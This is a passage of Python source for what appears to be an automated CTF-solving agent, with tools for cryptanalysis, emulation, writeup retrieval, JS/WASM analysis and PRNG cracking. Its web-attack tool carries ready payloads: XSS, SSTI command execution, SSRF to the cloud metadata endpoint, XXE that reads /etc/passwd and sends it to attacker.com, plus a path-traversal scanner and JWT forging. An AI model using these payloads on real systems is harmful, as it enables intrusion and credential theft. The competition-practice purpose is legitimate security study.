                        "'><script>alert(1)</script>",'<img src=x onerror=alert(1)>',
                        '<svg onload=alert(1)>','javascript:alert(1)',
                        '{{7*7}}','${7*7}','<%= 7*7 %>']
            return f"XSS payloads to try:\n" + "\n".join(f"  {p}" for p in payloads)

        if attack == "path_traversal":
            payloads = ["../etc/passwd","../../etc/passwd","../../../etc/passwd",
                        "....//etc/passwd","..%2fetc%2fpasswd","..%252fetc%252fpasswd",
                        "/etc/passwd","%2fetc%2fpasswd","....\\..\\etc\\passwd"]
            code = f"""
import requests
url='{target_url}'; param='{params.get("param","file")}'; results=[]
for p in {payloads}:
    try:
        r=requests.get(url,params={{param:p}},timeout=5,verify=False)
        if 'root:' in r.text or 'bin/bash' in r.text:
            results.append(f"FOUND: {{repr(p)}}\\n{{r.text[:200]}}")
    except: pass
print('\\n'.join(results) if results else 'No path traversal found')
"""
            return tool_execute_python(code)

        if attack == "jwt_attack":
            token = params.get("token","")
            return tool_execute_python(f"""
import base64, json, hmac, hashlib
token = '{token}'
parts = token.split('.')
if len(parts)==3:
    def b64d(s):
        s+='='*(4-len(s)%4); return base64.urlsafe_b64decode(s)
    header=json.loads(b64d(parts[0])); payload=json.loads(b64d(parts[1]))
    print("Header:", header); print("Payload:", payload)
    # Try alg:none
    h2=base64.urlsafe_b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode()
    p2=parts[1]
    print("\\nalg:none token:", f"{{h2}}.{{p2}}.")
    # Try HS256 with common secrets
    for secret in ['','secret','password','jwt','key','private','supersecret','changeme']:
        sig=base64.urlsafe_b64encode(hmac.new(secret.encode(),f'{{parts[0]}}.{{parts[1]}}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
        if sig==parts[2]: print(f"\\nFound secret: '{{secret}}'"); break
    else: print("\\nCommon secrets failed — need the actual key or use RS256/HS256 confusion attack")
""")

        if attack == "ssti_test":
            payloads = {"Jinja2":["{{7*7}}","{{7*'7'}}","{{config}}"],
                        "Twig":["{{7*7}}","{{dump(app)}}"],
                        "FreeMarker":["${{7*7}}","<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('id')}}"],
                        "Velocity":["#set($x=7*7)$x"],
                        "Mako":["${{7*7}}","<%exec('id')%>"]}
            return "SSTI payloads:\n" + "\n".join(f"{engine}: {pls}" for engine,pls in payloads.items())

        if attack == "ssrf_test":
            payloads = ["http://127.0.0.1","http://localhost","http://169.254.169.254",
                        "http://192.168.1.1","http://10.0.0.1","file:///etc/passwd",
                        "dict://127.0.0.1:6379/","gopher://127.0.0.1:6379/_PING"]
            return "SSRF payloads:\n" + "\n".join(f"  {p}" for p in payloads)

        if attack == "xxe":
            return """XXE payloads:
Basic: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
Blind: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
OOB: <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">"""

        if attack == "deserialization":
            return _shell("ysoserial --help 2>/dev/null | head -20 || echo 'Install ysoserial for Java deserialization gadgets'; python3 -c 'import pickle; print(\"Python pickle RCE: use pickle.loads with crafted payload\")'")

        if attack == "prototype_pollution":
            payloads = ['{"__proto__":{"admin":true}}','{"constructor":{"prototype":{"admin":true}}}',
                        '?__proto__[admin]=1','?constructor[prototype][admin]=1']
            return "Prototype pollution payloads:\n" + "\n".join(f"  {p}" for p in payloads)

        return f"Unknown web attack: {attack}"
    except Exception as e: return f"Web attack error: {e}"

def tool_z3_solve(constraints_code):
    """Run Z3 SMT solver for constraint solving (CTF math, reverse engineering)."""
    code = f"""
from z3 import *
{constraints_code}
"""
    return tool_execute_python(code)

def tool_sage_math(code):
    """Run SageMath for advanced math — LLL lattice reduction, elliptic curves, factoring."""
    result = _shell(f"sage -c \"{code.replace(chr(34),chr(39))}\" 2>&1", timeout=60)
    if "sage: command not found" in result or "not found" in result.lower():
        return f"SageMath not installed. Running in Python:\n{tool_execute_python(code)}"
    return result

def tool_dlog(operation: str = "auto", **params) -> str:
    """
    Discrete logarithm: baby_giant, pohlig_hellman, ecc_dlog, index_calculus, auto.
    Params: g,h,p (prime field) or Gx,Gy,Px,Py,a,b (ECC). n=group order, factors=[(q,e)...]
    """
    op = operation.lower()
    g = params.get("g",0); h = params.get("h",0); p = params.get("p",0)

    if op in ("baby_giant","auto"):
        n = params.get("n",0)
        code = f"""
from math import isqrt, ceil
g,h,p,n = {g},{h},{p},{n or '(p-1)'}
m=ceil(isqrt(n))+1; table={{}}; gj=1
for j in range(m): table[gj]=j; gj=gj*g%p
gm=pow(pow(g,m,p),-1,p); val=h
for i in range(m):
    if val in table:
        x=i*m+table[val]; print(f"x={{x}}"); print(f"Verify: {{pow(g,x,p)}}=={{h}}"); break
    val=val*gm%p
else: print("BSGS failed — try pohlig_hellman or index_calculus")
"""
        result = tool_execute_python(code, timeout=60)
        if "x=" in result or op != "auto": return result
        op = "pohlig_hellman"

    if op == "pohlig_hellman":
        factors = params.get("factors",[])
        n = params.get("n", p-1) if p else 0
        code = f"""
g,h,p,n = {g},{h},{p},{n}
factors = {factors}
if not factors:
    remaining=n or (p-1); facs=[]
    for pr in [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139]:
        if remaining%pr==0:
            e=0
            while remaining%pr==0: remaining//=pr; e+=1
            facs.append((pr,e))
    if remaining>1: facs.append((remaining,1))
    factors=facs; print(f"Factors of group order: {{factors}}")
from math import isqrt,ceil
residues=[]; moduli=[]
for (q,e) in factors:
    qe=q**e; ns=(n or p-1)//qe
    gs=pow(g,ns,p); hs=pow(h,ns,p)
    m=ceil(isqrt(qe))+1; table={{}}; gj=1
    for j in range(m): table[gj]=j; gj=gj*gs%p
    gm=pow(pow(gs,m,p),-1,p); val=hs; xs=None
    for i in range(m):
        if val in table: xs=i*m+table[val]; break
        val=val*gm%p
    residues.append((xs or 0)%qe); moduli.append(qe)
    print(f"  x={{xs or 0}} (mod {{qe}})")
M=1
for m in moduli: M*=m
x=0
for r,m in zip(residues,moduli): Mi=M//m; x+=r*Mi*pow(Mi,-1,m)
x%=M; print(f"x={{x}}"); print(f"Verify: {{pow(g,x,p)}}=={{h}}")
"""
        return tool_execute_python(code, timeout=120)

    if op == "ecc_dlog":
        sage_code = (f"p,a,b={params.get('p',0)},{params.get('a',0)},{params.get('b',0)}\n"
                     f"E=EllipticCurve(GF(p),[a,b])\n"
                     f"G=E({params.get('Gx',0)},{params.get('Gy',0)})\n"
                     f"P=E({params.get('Px',0)},{params.get('Py',0)})\n"
                     f"n={params.get('order',0)} or G.order()\n"
                     f"x=discrete_log(P,G,n,operation='+')\n"
                     f"print(f'x={{x}}'); print(f'Verify: {{x*G}}')")
        return tool_sage_math(sage_code)

    if op == "index_calculus":
        return tool_sage_math(f"p={p};g={g};h={h}\nprint(discrete_log(Mod(h,p),Mod(g,p)))")

    return f"Unknown op '{operation}'. Available: baby_giant, pohlig_hellman, ecc_dlog, index_calculus, auto"


def tool_unicorn_emulate(arch: str = "x86_64", shellcode_hex: str = "",
                          code_addr: int = 0x1000, code: str = "",
                          registers: dict = None, timeout: int = 60) -> str:
    """
    Unicorn CPU emulator — safely run shellcode/bytecode for any arch.
    Supports: x86, x86_64, arm, arm64/aarch64, mips.
    shellcode_hex: hex bytes to load at code_addr.
    code: extra Unicorn Python after setup (uc available).
    registers: {reg_name: value} to set before emulation.
    """
    arch_map = {
        "x86":    ("UC_ARCH_X86","UC_MODE_32","x86"),
        "x86_64": ("UC_ARCH_X86","UC_MODE_64","x86"),
        "arm":    ("UC_ARCH_ARM","UC_MODE_ARM","arm"),
        "arm64":  ("UC_ARCH_ARM64","UC_MODE_ARM","arm64"),
        "aarch64":("UC_ARCH_ARM64","UC_MODE_ARM","arm64"),
        "mips":   ("UC_ARCH_MIPS","UC_MODE_MIPS32","mips"),
    }
    a, m, cm = arch_map.get(arch.lower(), ("UC_ARCH_X86","UC_MODE_64","x86"))
    regs_code = ""
    if registers:
        for rn, rv in (registers or {}).items():
            regs_code += f"\n    uc.reg_write(uc_const.UC_{cm.upper()}_REG_{rn.upper()}, {rv})"
    user_code = code or (
        f"uc.emu_start(CODE_ADDR, CODE_ADDR+len(code_bytes), timeout=5*UC_SECOND_SCALE, count=10000)"
        if shellcode_hex else "print('Provide shellcode_hex or code=')"
    )
    full = f"""
try:
    from unicorn import *; from unicorn import {cm}_const as uc_const
    CODE_ADDR={code_addr}
    code_bytes=bytes.fromhex("{shellcode_hex}") if "{shellcode_hex}" else b""
    uc=Uc({a},{m})
    uc.mem_map(CODE_ADDR&~0xfff, 4*1024*1024)
    if code_bytes: uc.mem_write(CODE_ADDR, code_bytes)
    uc.mem_map(0x100000, 4*1024*1024)  # stack region
    {regs_code}
    if '{arch}' in ('x86_64','x86'):
        sp=uc_const.UC_X86_REG_RSP if '64' in '{arch}' else uc_const.UC_X86_REG_ESP
        uc.reg_write(sp, 0x300000)
    log=[]
    def hc(uc,a,s,u): log.append(hex(a)); (uc.emu_stop() if len(log)>500 else None)
    def hm(uc,ac,a,s,v,u):
        t={{UC_MEM_READ_UNMAPPED:"R",UC_MEM_WRITE_UNMAPPED:"W",UC_MEM_FETCH_UNMAPPED:"F"}}
        print(f"[MEM] {{t.get(ac,'?')}} at {{hex(a)}}"); return False
    uc.hook_add(UC_HOOK_CODE,hc); uc.hook_add(UC_HOOK_MEM_INVALID,hm)
    {user_code}
    print(f"Executed {{len(log)}} instructions | trace: {{log[:20]}}")
    if '{cm}'=='x86':
        for r in (['RAX','RBX','RCX','RDX','RSI','RDI','RIP','RSP'] if '64' in '{arch}' else ['EAX','EBX','ECX','EIP','ESP']):
            try: print(f"  {{r}}={{hex(uc.reg_read(getattr(uc_const,'UC_X86_REG_'+r)))}}")
            except: pass
except ImportError: print("pip install unicorn")
except UcError as e: print(f"UcError: {{e}}")
except Exception as e:
    import traceback; traceback.print_exc()
"""
    return tool_execute_python(full, timeout=timeout)


def tool_writeup_rag(description: str, category: str, ctf_name: str = "",
                      db_path: str = "~/.ctf-solver/writeups.db", n_results: int = 5) -> str:
    """
    Retrieve similar CTF writeups from local ChromaDB vector store.
    Returns top-N writeups by semantic similarity — lets Claude recall
    known-good approaches for near-identical past challenges.
    Build the DB once with: tool_index_writeups('/path/to/writeup/dir').
    """
    db_expanded = os.path.expanduser(db_path)
    code = f"""
import os
try:
    import chromadb
    client=chromadb.PersistentClient(path={repr(db_expanded)})
    try: col=client.get_collection("writeups")
    except: print("DB not found. Build with: tool_index_writeups('/path/to/writeups/')"); exit()
    q=f"{category}: {description[:800]}"
    r=col.query(query_texts=[q],n_results=min({n_results},col.count()),include=["documents","metadatas","distances"])
    for i,(doc,meta,dist) in enumerate(zip(r["documents"][0],r["metadatas"][0],r["distances"][0])):
        print(f"\\n[{{i+1}}] {{meta.get('title','?')}} | {{meta.get('ctf','?')}} | sim={{1-dist:.2f}}")
        print(doc[:2500])
except ImportError: print("pip install chromadb")
"""
    return tool_execute_python(code, timeout=20)


def tool_index_writeups(writeups_dir: str, db_path: str = "~/.ctf-solver/writeups.db") -> str:
    """
    Index a directory of CTF writeups (.md/.txt) into ChromaDB for RAG retrieval.
    Run once. Then tool_writeup_rag uses it at solve time automatically.
    """
    db_expanded = os.path.expanduser(db_path)
    code = f"""
import os, re, hashlib; from pathlib import Path
wd={repr(writeups_dir)}; db={repr(db_expanded)}
try:
    import chromadb
    os.makedirs(db,exist_ok=True)
    c=chromadb.PersistentClient(path=db)
    try: c.delete_collection("writeups")
    except: pass
    col=c.create_collection("writeups",metadata={{"hnsw:space":"cosine"}})
    files=list(Path(wd).rglob("*.md"))+list(Path(wd).rglob("*.txt"))
    print(f"Indexing {{len(files)}} files from {{wd}}")
    bd=[]; bi=[]; bm=[]; cnt=0
    for f in files:
        try:
            txt=f.read_text(encoding='utf-8',errors='replace')
            if len(txt)<80: continue
            parts=f.parts
            tm=re.search(r'^#{{1,2}}\\s+(.+)',txt,re.MULTILINE)
            title=(tm.group(1) if tm else f.stem)[:100]
            bd.append(txt[:8000]); bi.append(hashlib.md5(str(f).encode()).hexdigest())
            bm.append({{"title":title,"ctf":(parts[-3] if len(parts)>=3 else "")[:50],
                        "category":(parts[-2] if len(parts)>=2 else "")[:50],"path":str(f)[:200]}})
            if len(bd)>=100:
                col.add(documents=bd,ids=bi,metadatas=bm); cnt+=len(bd)
                print(f"  {{cnt}} indexed..."); bd.clear(); bi.clear(); bm.clear()
        except: pass
    if bd: col.add(documents=bd,ids=bi,metadatas=bm); cnt+=len(bd)
    print(f"Done! {{cnt}} writeups indexed into {{db}}")
except ImportError: print("pip install chromadb")
"""
    return tool_execute_python(code, timeout=300)


def tool_statistical_analysis(operation, data, **params):
    """Statistical tools for side-channel attacks, LRU oracle, timing analysis."""
    code = f"""
import math, json
from collections import Counter

operation = '{operation}'
data_raw = {json.dumps(data)}

if operation == 'log_likelihood_ratio':
    # data should be {{'true_hits': [k0,k1,k2,...], 'false_hits': [k0,k1,k2,...]}}
    # where each k = number of replicas that survived out of n
    true_hits  = data_raw.get('true_hits', [])
    false_hits = data_raw.get('false_hits', [])
    n_replicas = data_raw.get('n_replicas', 3)
    t_hist = [0]*(n_replicas+1)
    f_hist = [0]*(n_replicas+1)
    for k in true_hits:  t_hist[min(k,n_replicas)]+=1
    for k in false_hits: f_hist[min(k,n_replicas)]+=1
    t_total=sum(t_hist); f_total=sum(f_hist)
    eps=0.5
    llr=[]
    for k in range(n_replicas+1):
        tp=max(t_hist[k],eps)/max(t_total,1)
        fp=max(f_hist[k],eps)/max(f_total,1)
        llr.append(math.log(tp/fp))
    print("LLR table:", [round(x,3) for x in llr])
    print("Interpretation: positive=likely matched, negative=likely missed")

elif operation == 'beam_search':
    # Reconstruct a string from scored n-gram evidence
    import heapq
    alphabet   = data_raw.get('alphabet', '0123456789abcdef')
    target_len = data_raw.get('target_len', 32)
    ngram_scores= data_raw.get('ngram_scores', {{}})  # {{'abc': 2.1, 'xyz': -1.5}}
    beam_width = data_raw.get('beam_width', 1000)
    prefix_scores = data_raw.get('prefix_scores', {{}})
    suffix_scores = data_raw.get('suffix_scores', {{}})

    # Seed with all possible starting n-grams
    seed_len = min(3, target_len)
    candidates = []
    for combo in __import__('itertools').product(alphabet, repeat=seed_len):
        s = ''.join(combo)
        score = ngram_scores.get(s, 0)
        if s[:2] in prefix_scores: score += prefix_scores[s[:2]]
        candidates.append((score, s))

    candidates.sort(reverse=True)
    candidates = candidates[:beam_width]

    for pos in range(seed_len, target_len):
        new_candidates = []
        for score, s in candidates:
            for c in alphabet:
                new_s = s + c
                new_score = score
                # Score new trigram
                if pos >= 2:
                    trigram = new_s[-3:]
                    new_score += ngram_scores.get(trigram, 0)
                # Bigram
                bigram = new_s[-2:]
                new_score += ngram_scores.get(bigram, 0) * 0.5
                new_candidates.append((new_score, new_s))
        new_candidates.sort(reverse=True)
        candidates = new_candidates[:beam_width]

    # Add suffix scores
    final = []
    for score, s in candidates:
        if s[-2:] in suffix_scores: score += suffix_scores[s[-2:]]
        final.append((score, s))
    final.sort(reverse=True)
    print("Top 10 candidates:")
    for score, s in final[:10]:
        print(f"  {{s}} (score={{score:.3f}})")

elif operation == 'frequency_analysis':
    text = data_raw if isinstance(data_raw, str) else str(data_raw)
    chars = [c.upper() for c in text if c.isalpha()]
    freq = Counter(chars)
    total = len(chars)
    en_order = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'
    obs_order = ''.join(c for c,_ in freq.most_common())
    print(f"Total letters: {{total}}")
    print("Top 10 frequencies:")
    for c,n in freq.most_common(10):
        print(f"  {{c}}: {{n}} ({{100*n/total:.1f}}%) — maps to {{en_order[obs_order.index(c)] if obs_order.index(c)<len(en_order) else '?'}}")

elif operation == 'timing_analysis':
    times = data_raw if isinstance(data_raw, list) else []
    if times:
        avg=sum(times)/len(times); std=math.sqrt(sum((t-avg)**2 for t in times)/len(times))
        print(f"Count: {{len(times)}}, Mean: {{avg:.4f}}s, Std: {{std:.4f}}s")
        print(f"Min: {{min(times):.4f}}s, Max: {{max(times):.4f}}s")
        outliers=[t for t in times if abs(t-avg)>2*std]
        print(f"Outliers (>2σ): {{outliers}}")

elif operation == 'index_of_coincidence':
    text = data_raw if isinstance(data_raw, str) else ''
    text = ''.join(c.upper() for c in text if c.isalpha())
    n=len(text); freq=Counter(text)
    ic=sum(f*(f-1) for f in freq.values())/(n*(n-1)) if n>1 else 0
    print(f"IC = {{ic:.4f}} (English≈0.065, random≈0.038)")
    print("High IC = monoalphabetic cipher (Caesar, Atbash)")
    print("Low IC  = polyalphabetic cipher (Vigenere, OTP)")
"""
    return tool_execute_python(code)

def tool_create_workspace(base_dir, ctf_name, category, challenge_name):
    try:
        def safe(s):
            s=re.sub(r'[<>:"/\\|?*]',"_",s.strip())
            return re.sub(r'\s+'," ",s)[:80]
        folder=os.path.join(base_dir,safe(ctf_name),safe(category),safe(challenge_name))
        os.makedirs(os.path.join(folder,"files"),exist_ok=True)
        os.makedirs(os.path.join(folder,"exploits"),exist_ok=True)
        os.makedirs(os.path.join(folder,"artifacts"),exist_ok=True)
        log("sys",f"Workspace: {folder}","")
        emit("workspace",path=folder)
        return f"Workspace created: {folder}\nSubdirs: files/ exploits/ artifacts/"
    except Exception as e: return f"Workspace error: {e}"

def tool_write_file(path, content, mode="w"):
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)),exist_ok=True)
        with open(path,mode,encoding="utf-8") as f: f.write(content)
        size=os.path.getsize(path)
        log("sys",f"Wrote {size}B → {path}","")
        if path.endswith(".md"): emit("writeup",path=path)
        return f"Saved: {path} ({size} bytes)"
    except Exception as e: return f"Write error: {e}"

def tool_write_binary(path, hex_content):
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)),exist_ok=True)
        with open(path,"wb") as f: f.write(bytes.fromhex(hex_content.replace(" ","")))
        return f"Written {os.path.getsize(path)} bytes to {path}"
    except Exception as e: return f"Write binary error: {e}"

def tool_download_file(url, dest_path, headers=None, cookies=None):
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        os.makedirs(os.path.dirname(os.path.abspath(dest_path)),exist_ok=True)
        resp=requests.get(url,headers=headers or {},cookies=cookies or {},
                          stream=True,timeout=60,verify=False)
        resp.raise_for_status()
        with open(dest_path,"wb") as f:
            for chunk in resp.iter_content(8192): f.write(chunk)
        size=os.path.getsize(dest_path)
        log("sys",f"Downloaded {size}B → {dest_path}","")
        return f"Downloaded: {dest_path} ({size} bytes)"
    except Exception as e: return f"Download error: {e}"

_PLATFORM_CONFIG = {}

def tool_submit_flag(flag, challenge_id=""):
    flag=flag.strip()
    if not _PLATFORM_CONFIG or _PLATFORM_CONFIG.get("type")=="manual":
        return f"Manual mode — submit flag:\n{flag}"
    try:
        sys.path.insert(0,os.path.dirname(os.path.abspath(__file__)))
        from platforms import submit_flag_to_platform
        res=submit_flag_to_platform(_PLATFORM_CONFIG,challenge_id or _PLATFORM_CONFIG.get("challenge_id",""),flag)
        if res.get("error"): return f"Submission error: {res['error']}"
        if res.get("correct") is True:
            log("ok","✓ Flag accepted!","white")
            return f"CORRECT! {flag}"
        elif res.get("correct") is False:
            return f"INCORRECT. {res.get('message','')}"
        return f"Response: {res}"
    except Exception as e: return f"Submit error: {e}"

# ──────────────────────────────────────────────────────────────────────────────
# NEW TOOLS (from advanced writeup analysis)
# ──────────────────────────────────────────────────────────────────────────────

def tool_js_analyze(url_or_path, operation):
    """
    JavaScript analysis: source map recovery, endpoint extraction, minified code
    deobfuscation. From msfrog-generator: .map files expose full source of minified JS.
    """
    try:
        if operation == "fetch_sourcemap":
            # Try common source map locations
            import requests; requests.packages.urllib3.disable_warnings()
            targets = []
            if url_or_path.endswith(".js"):
                targets = [url_or_path + ".map", url_or_path.replace(".js", ".js.map")]
            else:
                targets = [url_or_path]
            for t in targets:
                try:
                    r = requests.get(t, timeout=10, verify=False)
                    if r.status_code == 200 and ("sources" in r.text or "sourceRoot" in r.text):
                        data = r.json()
                        sources = data.get("sources", [])
                        out = [f"Source map found: {t}", f"Sources ({len(sources)}):"]
                        out += [f"  {s}" for s in sources[:30]]
                        # Extract source content if available
                        contents = data.get("sourcesContent", [])
                        if contents:
                            out.append(f"\nFirst source content ({sources[0] if sources else '?'}):")
                            out.append(str(contents[0])[:3000])
                        return "\n".join(out)
                except: pass
            return f"No source map found at common locations for: {url_or_path}"

        if operation == "extract_endpoints":
            # From JS source/minified code find API endpoints
            if url_or_path.startswith("http"):
                import requests; requests.packages.urllib3.disable_warnings()
                content = requests.get(url_or_path, timeout=10, verify=False).text
            else:
                with open(url_or_path, "r", errors="replace") as f: content = f.read()
            # Find fetch/axios/XHR calls and URL strings
            patterns = [
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.[a-z]+\(["\']([^"\']+)["\']',
                r'\.get\(["\']([/][^"\']+)["\']',
                r'\.post\(["\']([/][^"\']+)["\']',
                r'["\'](/api/[^"\']+)["\']',
                r'["\'](/[a-zA-Z][a-zA-Z0-9_/-]+)["\']',
                r'url\s*[=:]\s*["\']([^"\']+)["\']',
                r'path\s*[=:]\s*["\']([/][^"\']+)["\']',
            ]
            found = set()
            for pat in patterns:
                found.update(re.findall(pat, content))
            # Filter noise
            found = {e for e in found if len(e) > 2 and not e.startswith("//") and "." not in e.split("/")[-1][:3]}
            out = [f"Endpoints found ({len(found)}):"] + sorted(found)
            # Also find comments
            comments = re.findall(r'//[^\n]{5,100}|/\*[\s\S]{5,200}?\*/', content)
            if comments:
                out.append(f"\nComments ({len(comments)}):")
                out += comments[:20]
            return "\n".join(out[:100])

        if operation == "beautify":
            # Use js-beautify if available, else basic formatting
            out = _shell(f"js-beautify '{url_or_path}' 2>/dev/null || node -e \"const fs=require('fs'); console.log(fs.readFileSync('{url_or_path}','utf8'))\" 2>/dev/null")
            if "not found" in out.lower() or not out.strip():
                # Python fallback: just add newlines after ; { }
                with open(url_or_path,"r",errors="replace") as f: code=f.read()
                code = re.sub(r'([;{])', r'\1\n', code)
                return code[:5000]
            return out[:5000]

        if operation == "find_secrets":
            if url_or_path.startswith("http"):
                import requests; requests.packages.urllib3.disable_warnings()
                content = requests.get(url_or_path, timeout=10, verify=False).text
            else:
                with open(url_or_path,"r",errors="replace") as f: content=f.read()
            patterns = {
                "API Keys": r'["\']([a-zA-Z0-9_-]{20,})["\']',
                "Passwords": r'password["\s]*[:=]["\s]*["\']([^"\']{4,})["\']',
                "Tokens": r'token["\s]*[:=]["\s]*["\']([^"\']{8,})["\']',
                "Secrets": r'secret["\s]*[:=]["\s]*["\']([^"\']{4,})["\']',
                "URLs": r'https?://[^\s"\'<>]{10,100}',
            }
            out = []
            for name, pat in patterns.items():
                hits = re.findall(pat, content, re.IGNORECASE)[:10]
                if hits: out.append(f"{name}: {hits}")
            return "\n".join(out) or "No obvious secrets found"

        return f"Unknown operation: {operation}. Available: fetch_sourcemap, extract_endpoints, beautify, find_secrets"
    except Exception as e:
        return f"JS analysis error: {e}"


def tool_wasm_analyze(path, operation):
    """
    WebAssembly analysis. From Pachinko Revisited: WASM binaries contain synthesized
    Verilog/CPU logic as bitwise xors. Extract as Python, find I/O ports, emulate.
    """
    sp = _w2l(path) if (IS_WINDOWS and USE_WSL) else path
    try:
        if operation == "decompile":
            # wasm2wat is from wabt toolkit
            out = _shell(f"wasm2wat '{sp}' 2>/dev/null | head -200")
            if "not found" in out.lower():
                out = _shell(f"wasm-decompile '{sp}' 2>/dev/null | head -200")
            if "not found" in out.lower():
                return "Install wabt: sudo apt install wabt\nOr use: pip install wasmtime\nFallback: strings analysis below\n\n" + _shell(f"strings '{sp}' | head -100")
            return out

        if operation == "strings":
            return _shell(f"strings '{sp}' | head -200")

        if operation == "exports_imports":
            out = _shell(f"wasm-objdump -x '{sp}' 2>/dev/null | grep -E 'Export|Import|Function|Memory|Table' | head -60")
            if "not found" in out.lower():
                # Python fallback
                return tool_execute_python(f"""
import struct
data = open(r'{path}', 'rb').read()
# Find export/import sections by WASM magic
if data[:4] != b'\\x00asm':
    print("Not a valid WASM file"); exit()
print(f"WASM version: {{struct.unpack('<I', data[4:8])[0]}}")
# Find function names via strings
import re
names = re.findall(rb'[a-zA-Z_][a-zA-Z0-9_]{{3,}}', data)
unique = list(dict.fromkeys(n.decode() for n in names))[:60]
print("Identifiers:", unique)
""")
            return out

        if operation == "to_python":
            # Convert WASM to WAT then extract logic as Python
            wat = _shell(f"wasm2wat '{sp}' 2>/dev/null")
            if "not found" in wat.lower():
                return "Install wabt to convert WASM→WAT→Python. See: https://github.com/WebAssembly/wabt"
            # Count instructions to give size estimate
            insn_count = wat.count("i32.xor") + wat.count("i32.and") + wat.count("i32.or")
            return (f"WAT output ({len(wat)} chars, ~{insn_count} bitwise ops):\n"
                    f"Use execute_python with wasmtime to run directly:\n"
                    f"  from wasmtime import Store, Module, Instance\n"
                    f"  store = Store()\n"
                    f"  module = Module.from_file(store.engine, '{path}')\n"
                    f"  instance = Instance(store, module, [])\n"
                    f"  func = instance.exports(store)['process']\n"
                    f"  result = func(store, ...)\n\n"
                    f"WAT preview:\n{wat[:3000]}")

        if operation == "run":
            return tool_execute_python(f"""
try:
    from wasmtime import Store, Module, Instance, Func, FuncType, ValType
    store = Store()
    module = Module.from_file(store.engine, r'{path}')
    instance = Instance(store, module, [])
    exports = instance.exports(store)
    print("Exports:", list(exports._mapping.keys()))
except ImportError:
    print("Install wasmtime: pip install wasmtime")
except Exception as e:
    print(f"WASM run error: {{e}}")
""")

        if operation == "analyze_bitops":
            # Analyze bitwise operations to find I/O ports (read-only = input, write-only = output)
            wat = _shell(f"wasm2wat '{sp}' 2>/dev/null")
            if not wat.strip() or "not found" in wat.lower():
                return "Need wasm2wat from wabt toolkit"
            # Find all load/store indices to state array
            loads  = set(re.findall(r'i32\.load8_u.*?offset=(\d+)', wat))
            stores = set(re.findall(r'i32\.store8.*?offset=(\d+)', wat))
            # Or array accesses
            loads2  = set(re.findall(r'get_local.*?\(i32\.const (\d+)\)', wat))
            readonly  = sorted(loads - stores,  key=int)[:40]
            writeonly = sorted(stores - loads,  key=int)[:40]
            both      = sorted(loads & stores,  key=int)[:20]
            return (f"Read-only (inputs):  {readonly}\n"
                    f"Write-only (outputs): {writeonly}\n"
                    f"Read+Write (internal): {both[:10]}")

        return f"Unknown op. Available: decompile, strings, exports_imports, to_python, run, analyze_bitops"
    except Exception as e:
        return f"WASM error: {e}"


def tool_rng_crack(operation, outputs=None, bits=32, modulus=None, multiplier=None, increment=None):
    """
    PRNG cracking.
    - mt19937_from_outputs: Crack Python's random / MT19937 from 32-bit outputs (needs z3 or randcrack)
    - mt19937_predict_boundary: From Python random.randrange(2**63) boundary strings → predict next
    - lcg_crack: Crack Linear Congruential Generator from consecutive outputs
    - python_random_from_randbits63: Crack Python random from getrandbits(63) calls (like email boundaries)
    """
    outputs = outputs or []
    try:
        if operation == "mt19937_from_outputs":
            return tool_execute_python(f"""
outputs = {outputs}
try:
    from randcrack import RandCrack
    rc = RandCrack()
    for o in outputs[:624]:
        rc.submit(int(o))
    print("State cracked! Next predictions:")
    for i in range(5):
        print(f"  getrandbits(32): {{rc.predict_getrandbits(32)}}")
except ImportError:
    print("Install randcrack: pip install randcrack")
    print("Or use z3_crack from: https://github.com/icemonster/symbolic_mersenne_cracker")
""")

        if operation == "python_random_from_randbits63":
            # This is the exact technique from secure-email-service:
            # Python's email module uses random.randrange(sys.maxsize) = randrange(2**63)
            # which calls getrandbits(63) = two 32-bit words with top bit stripped
            return tool_execute_python(f"""
# Crack Python random.randrange(2**63) from observed boundary values
# Each boundary = random.randrange(2**63) = getrandbits(63)
# Internally: two 32-bit MT words, top bit of word1 stripped → 31 + 32 = 63 bits
boundaries = {outputs}
print(f"Have {{len(boundaries)}} boundary observations")

try:
    # Try z3_crack (symbolic MT cracker that handles missing bits)
    # From: https://github.com/icemonster/symbolic_mersenne_cracker
    import importlib.util, sys, os
    # Look for z3_crack in same directory or PATH
    for search_dir in [os.path.dirname(__file__) if '__file__' in dir() else '.', '.', '/tmp']:
        z3_path = os.path.join(search_dir, 'z3_crack.py')
        if os.path.exists(z3_path):
            spec = importlib.util.spec_from_file_location("z3_crack", z3_path)
            z3_crack = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(z3_crack)
            break
    else:
        raise ImportError("z3_crack not found")

    ut = z3_crack.Untwister()
    for b in boundaries:
        b = int(b)
        bin_str = bin(b)[2:].zfill(63)
        half1 = bin_str[:31] + '?'  # top bit stripped by Python
        half2 = bin_str[31:]
        ut.submit(half2)
        ut.submit(half1)
    r2 = ut.get_random()
    print("State cracked!")
    print("Next 5 predictions (getrandbits(63)):")
    for i in range(5):
        print(f"  {{r2.getrandbits(63)}}")
    print("\\nFormat as email boundary (%019d):")
    for i in range(5):
        print(f"  {{('%019d' % r2.getrandbits(63))}}")
except ImportError as e:
    print(f"Missing: {{e}}")
    print("Download z3_crack.py from:")
    print("  https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py")
    print("Place it in the same directory as solver.py")
    print()
    print("Alternatively, use randcrack with 32-bit values split from 63-bit outputs:")
    for b in boundaries[:3]:
        b = int(b)
        print(f"  boundary={b} → hi32={b>>31} lo32={b&0x7fffffff}")
""")

        if operation == "lcg_crack":
            # Linear Congruential Generator: x_{n+1} = (a*x_n + c) % m
            return tool_execute_python(f"""
outputs = {outputs}
modulus = {modulus or 0}
multiplier = {multiplier or 0}
increment = {increment or 0}
